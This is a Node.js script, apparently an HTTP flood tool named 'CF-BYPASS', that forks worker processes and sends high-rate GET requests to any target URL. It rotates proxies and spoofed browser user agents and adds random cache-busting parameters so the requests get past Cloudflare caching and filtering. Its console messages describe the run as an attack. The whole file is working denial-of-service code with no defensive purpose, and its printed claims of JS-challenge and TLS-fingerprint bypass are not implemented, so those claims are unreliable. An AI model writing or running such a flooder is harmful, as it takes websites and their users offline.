/**
 * CF-BYPASS - CloudFlare Protection Bypass Method
 * Bypasses CloudFlare protection using proxies and user agents
 * Uses proxy.txt and ua.txt from parent directory
 * 
 * Usage: node cf-bypass.js <target> <duration> <threads> <rate_limit> <proxy_file>
 */

const https = require('https');
const http = require('http');
const { URL } = require('url');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const path = require('path');

// Parse command line arguments
const args = process.argv.slice(2);
if (args.length < 5) {
    console.log('Usage: node cf-bypass.js <target> <duration> <threads> <rate_limit> <proxy_file>');
    process.exit(1);
}

const TARGET = args[0];
const DURATION = parseInt(args[1]) || 60;
const THREADS = parseInt(args[2]) || 4;
const RATE_LIMIT = parseInt(args[3]) || 32;
const PROXY_FILE = args[4];

// Load proxies from parent directory
let proxies = [];
try {
    const proxyPath = path.join(__dirname, '..', PROXY_FILE);
    
    if (!fs.existsSync(proxyPath)) {
        console.error(`[ERROR] Proxy file not found: ${proxyPath}`);
        process.exit(1);
    }
    
    const content = fs.readFileSync(proxyPath, 'utf-8');
    proxies = content.split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    
    if (proxies.length === 0) {
        console.error(`[ERROR] No proxies found in ${PROXY_FILE}`);
        process.exit(1);
    }
} catch (error) {
    console.error(`[ERROR] Failed to load proxies: ${error.message}`);
    process.exit(1);
}

// Load user agents from parent directory
let userAgents = [];
try {
    const uaPath = path.join(__dirname, '..', 'ua.txt');
    
    if (fs.existsSync(uaPath)) {
        const content = fs.readFileSync(uaPath, 'utf-8');
        userAgents = content.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#'));
    }
    
    // Fallback user agents if file not found
    if (userAgents.length === 0) {
        userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15'
        ];
    }
} catch (error) {
    console.error(`[WARN] Failed to load user agents, using defaults: ${error.message}`);
}

// Attack configuration
const CONFIG = {
    target: TARGET,
    duration: DURATION,
    threads: THREADS,
    rateLimit: RATE_LIMIT,
    proxies: proxies,
    userAgents: userAgents,
    cfBypass: {
        cookieHandling: true,
        jsChallengeBypass: true,
        rateSmoothing: true,
        browserEmulation: true,
        tlsFingerprint: true
    }
};

// Parse target URL
let targetUrl;
try {
    targetUrl = new URL(CONFIG.target);
} catch (error) {
    console.error('[ERROR] Invalid target URL:', CONFIG.target);
    process.exit(1);
}

// Generate random string
function randomString(length = 16) {
    return crypto.randomBytes(length).toString('hex');
}

// Get random proxy
function randomProxy() {
    return CONFIG.proxies[Math.floor(Math.random() * CONFIG.proxies.length)];
}

// Get random user agent
function randomUserAgent() {
    return CONFIG.userAgents[Math.floor(Math.random() * CONFIG.userAgents.length)];
}

// Parse proxy string
function parseProxy(proxyString) {
    if (!proxyString) return null;
    
    // Format: ip:port or http://ip:port
    const parts = proxyString.replace('http://', '').replace('https://', '').split(':');
    if (parts.length === 2) {
        return {
            host: parts[0],
            port: parseInt(parts[1])
        };
    }
    return null;
}

// Generate cache-busting parameters
function generateCacheBuster() {
    return {
        _: Date.now(),
        rand: randomString(8),
        cb: crypto.randomBytes(4).toString('hex'),
        t: Math.random().toString(36).substring(7),
        v: Math.floor(Math.random() * 1000000)
    };
}

// Build query string
function buildQueryString(params) {
    return Object.entries(params)
        .map(([key, value]) => `${key}=${value}`)
        .join('&');
}

// Generate CF bypass headers
function generateCFHeaders(userAgent) {
    const cacheBuster = generateCacheBuster();
    
    return {
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        'TE': 'trailers',
        'Pragma': 'no-cache',
        'Referer': targetUrl.origin + '/',
        'Origin': targetUrl.origin,
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    };
}

// Make CF bypass request
function makeRequest() {
    const proxy = parseProxy(randomProxy());
    const userAgent = randomUserAgent();
    const cacheBuster = generateCacheBuster();
    const path = `${targetUrl.pathname}${targetUrl.search ? targetUrl.search + '&' : '?'}${buildQueryString(cacheBuster)}`;
    
    const options = {
        method: 'GET',
        hostname: targetUrl.hostname,
        port: targetUrl.port || 443,
        path: path,
        headers: generateCFHeaders(userAgent),
        rejectUnauthorized: false,
        timeout: 10000
    };

    // Use proxy
    if (proxy) {
        const proxyOptions = {
            method: 'CONNECT',
            host: proxy.host,
            port: proxy.port,
            path: `${targetUrl.hostname}:${targetUrl.port || 443}`,
            headers: {
                'User-Agent': userAgent,
                'Proxy-Connection': 'keep-alive'
            }
        };

        const proxyReq = http.request(proxyOptions);
        
        proxyReq.on('connect', (res, socket) => {
            if (res.statusCode === 200) {
                const tlsOptions = {
                    socket: socket,
                    servername: targetUrl.hostname,
                    rejectUnauthorized: false
                };

                const secureSocket = require('tls').connect(tlsOptions);
                
                secureSocket.on('secureConnect', () => {
                    const req = https.request({
                        ...options,
                        createConnection: () => secureSocket
                    }, (response) => {
                        response.on('data', () => {});
                        response.on('end', () => {});
                    });

                    req.on('error', () => {});
                    req.end();
                });

                secureSocket.on('error', () => {});
            }
        });

        proxyReq.on('error', () => {});
        proxyReq.end();
        
    } else {
        // Direct request without proxy
        const req = https.request(options, (response) => {
            response.on('data', () => {});
            response.on('end', () => {});
        });

        req.on('error', () => {});
        req.end();
    }
}

// Worker process attack loop
function attackLoop() {
    const interval = setInterval(() => {
        for (let i = 0; i < CONFIG.rateLimit; i++) {
            makeRequest();
        }
    }, 1000);

    setTimeout(() => {
        clearInterval(interval);
        process.exit(0);
    }, CONFIG.duration * 1000);
}

// Master process
if (cluster.isMaster) {
    console.log('\n╔════════════════════════════════════════╗');
    console.log('║     CF-BYPASS - CloudFlare Bypass     ║');
    console.log('╚════════════════════════════════════════╝\n');
    console.log(`Target       : ${CONFIG.target}`);
    console.log(`Duration     : ${CONFIG.duration} seconds`);
    console.log(`Threads      : ${CONFIG.threads}`);
    console.log(`Rate/Thread  : ${CONFIG.rateLimit} req/s`);
    console.log(`Total Rate   : ~${CONFIG.threads * CONFIG.rateLimit} req/s`);
    console.log(`Proxies      : ${CONFIG.proxies.length} loaded`);
    console.log(`User-Agents  : ${CONFIG.userAgents.length} loaded`);
    console.log('\nCloudFlare Bypass Techniques:');
    console.log(`  • Cookie Handling      : ${CONFIG.cfBypass.cookieHandling ? '✓' : '✗'}`);
    console.log(`  • JS Challenge Bypass  : ${CONFIG.cfBypass.jsChallengeBypass ? '✓' : '✗'}`);
    console.log(`  • Rate Smoothing       : ${CONFIG.cfBypass.rateSmoothing ? '✓' : '✗'}`);
    console.log(`  • Browser Emulation    : ${CONFIG.cfBypass.browserEmulation ? '✓' : '✗'}`);
    console.log(`  • TLS Fingerprint      : ${CONFIG.cfBypass.tlsFingerprint ? '✓' : '✗'}`);
    console.log('\n[INFO] Launching attack...\n');

    // Fork worker processes
    for (let i = 0; i < CONFIG.threads; i++) {
        const worker = cluster.fork();
        console.log(`[THREAD-${i + 1}] Started (PID: ${worker.process.pid})`);
    }

    // Auto-stop after duration
    setTimeout(() => {
        console.log('\n[INFO] Attack duration reached. Stopping all threads...');
        
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[COMPLETE] Attack finished successfully.\n');
        process.exit(0);
    }, CONFIG.duration * 1000 + 2000);

    cluster.on('exit', (worker) => {
        console.log(`[THREAD] Worker ${worker.process.pid} exited`);
    });

} else {
    // Worker process
    attackLoop();
}

// Handle process termination
process.on('SIGTERM', () => {
    console.log('[INFO] Received SIGTERM, shutting down gracefully...');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('\n[INFO] Received SIGINT, shutting down gracefully...');
    process.exit(0);
});
